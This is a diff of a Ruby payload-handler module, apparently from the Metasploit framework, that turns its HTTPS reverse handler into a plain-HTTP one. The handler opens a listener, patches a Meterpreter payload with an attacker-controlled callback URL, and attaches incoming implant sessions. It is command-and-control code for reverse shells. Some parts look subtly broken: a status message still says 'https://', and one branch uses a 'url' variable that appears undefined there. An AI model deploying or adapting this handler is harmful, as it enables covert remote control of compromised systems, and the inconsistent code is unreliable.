@@ -9,7 +9,7 @@ module Handler
 # This handler implements the HTTP SSL tunneling interface.
 #
 ###
-module ReverseHttps
+module ReverseHttp
 
 	include Msf::Handler
 
@@ -18,7 +18,7 @@ module ReverseHttps
 	# 'reverse_http'.
 	#
 	def self.handler_type
-		return "reverse_https"
+		return "reverse_http"
 	end
 
 	#
@@ -50,7 +50,7 @@ module ReverseHttps
 	end
 
 	#
-	# Create an HTTPS listener
+	# Create a HTTP listener
 	#
 	def setup_handler
 
@@ -65,13 +65,12 @@ module ReverseHttps
 		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
 			datastore['LPORT'].to_i,
 			'0.0.0.0',
-			true,
+			false,
 			{
 				'Msf'        => framework,
 				'MsfExploit' => self,
 			},
-			comm,
-			datastore['SSLCert']
+			comm
 		)
 
 		# Create a reference to ourselves
@@ -85,7 +84,7 @@ module ReverseHttps
 			'VirtualDirectory' => true)
 
 		self.conn_ids = []
-		print_status("Started HTTPS reverse handler on https://#{datastore['LHOST']}:#{datastore['LPORT']}/")
+		print_status("Started HTTP reverse handler on https://#{datastore['LHOST']}:#{datastore['LPORT']}/")
 	end
 
 	#
@@ -106,7 +105,7 @@ module ReverseHttps
 	# active on sub-urls.
 	#
 	def stop_handler
-		self.service.remove_resource("/") if self.service
+		self.service.remove_resource("/")
 	end
 
 	attr_accessor :service # :nodoc:
@@ -137,7 +136,7 @@ protected
 				# Replace the transport string first (TRANSPORT_SOCKET_SSL
 				i = blob.index("METERPRETER_TRANSPORT_SSL")
 				if i
-					str = "METERPRETER_TRANSPORT_HTTPS\x00"
+					str = "METERPRETER_TRANSPORT_HTTP\x00"
 					blob[i, str.length] = str
 				end
 				print_status("Patched transport at offset #{i}...")
@@ -145,7 +144,7 @@ protected
 				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
 				i = blob.index("https://" + ("X" * 256))
 				if i
-					url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00"
+					url = "http://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00"
 					blob[i, url.length] = url
 				end
 				print_status("Patched URL at offset #{i}...")
@@ -156,6 +155,7 @@ protected
 					blob[i, str.length] = str
 				end
 				print_status("Patched Expiration Timeout at offset #{i}...")
+
 
 				i = blob.index([0xaf79257f].pack("V"))
 				if i
@@ -175,24 +175,24 @@ protected
 					:url                => url,
 					:expiration         => datastore['SessionExpirationTimeout'].to_i,
 					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-					:ssl                => true
+					:ssl                => false
 				})
-
 			when /^\/(CONN_.*)\//
 				resp.body = ""
 				conn_id = $1
 
-				if true # if not self.conn_ids.include?(conn_id)
+				if not self.conn_ids.include?(conn_id)
 					print_status("Incoming orphaned session #{conn_id}, reattaching...")
 					conn_ids << conn_id
 
+					# Short-circuit the payload's handle_connection processing for create_session
 					create_session(cli, {
 						:passive_dispatcher => obj.service,
 						:conn_id            => conn_id,
-						:url                => "https://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00",
+						:url                => url,
 						:expiration         => datastore['SessionExpirationTimeout'].to_i,
 						:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-						:ssl                => true
+						:ssl                => false
 					})
 				end
 			else
